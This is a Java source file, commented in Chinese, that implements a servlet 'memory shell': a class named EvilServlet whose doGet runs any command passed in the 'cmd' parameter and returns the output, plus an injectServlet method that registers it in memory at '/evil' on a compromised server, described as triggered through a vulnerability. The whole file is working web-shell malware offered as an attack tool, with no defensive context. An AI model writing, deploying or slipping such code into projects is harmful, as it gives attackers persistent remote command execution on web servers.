import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletRegistration;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

// 恶意Servlet类
public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                // 执行命令并回显结果
                Process process = Runtime.getRuntime().exec(cmd);
                InputStream in = process.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                String line;
                while ((line = reader.readLine()) != null) {
                    resp.getWriter().println(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    // 动态注册Servlet的代码（通过漏洞触发）
    public void injectServlet(HttpServletRequest request) {
        try {
            // 获取ServletContext
            ServletContext servletContext = request.getServletContext();

            // 创建恶意Servlet实例
            Servlet evilServlet = new EvilServlet();

            // 动态注册Servlet
            ServletRegistration.Dynamic dynamic = servletContext.addServlet("EvilServlet", evilServlet);
            dynamic.addMapping("/evil");
            dynamic.setLoadOnStartup(1);
            dynamic.setAsyncSupported(true);

            System.out.println("[+] Servlet内存马注入成功！");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

